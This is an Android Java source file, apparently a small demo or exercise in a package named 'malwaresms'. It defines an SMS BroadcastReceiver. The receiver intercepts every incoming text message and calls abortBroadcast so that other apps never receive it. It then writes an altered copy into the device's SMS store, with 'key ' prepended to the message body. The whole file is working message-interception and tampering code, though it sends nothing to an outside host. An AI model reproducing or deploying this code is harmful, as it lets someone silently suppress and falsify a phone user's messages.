package com.example.berangerelatouche.malwaresms;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {

    public static final String SMS_EXTRA_NAME = "pdus";
    public static final String SMS_URI = "content://sms";

    public static final String ADDRESS = "address";
    public static final String DATE = "date";
    public static final String BODY = "body";

    public void onReceive( Context context, Intent intent ) {
        // Get SMS map from Intent
        Bundle extras = intent.getExtras();

        String messages = "";

        if ( extras != null ) {
            // Get received SMS array
            Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );

            // Get ContentResolver object for pushing encrypted SMS to incoming folder
            ContentResolver contentResolver = context.getContentResolver();

            if (smsExtra != null) {
                for (Object sms : smsExtra) {
                    SmsMessage s = SmsMessage.createFromPdu((byte[])sms);

                    String body = s.getMessageBody();
                    String address = s.getOriginatingAddress();

                    messages += "SMS from " + address + " :\n";
                    messages += body + "\n";

                    putSmsToDatabase(contentResolver, s);
                }
            }

            // Display SMS message
            Toast.makeText( context, messages, Toast.LENGTH_SHORT ).show();
        }

        this.abortBroadcast();
    }

    private void putSmsToDatabase( ContentResolver contentResolver, SmsMessage sms ) {
        // Create SMS row
        ContentValues values = new ContentValues();
        values.put( ADDRESS, sms.getOriginatingAddress() );
        values.put( DATE, sms.getTimestampMillis() );

        try {
            String message = "key " + sms.getMessageBody();
            values.put( BODY, message );
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
        // Push row into the SMS table
        contentResolver.insert( Uri.parse( SMS_URI ), values );
    }
}
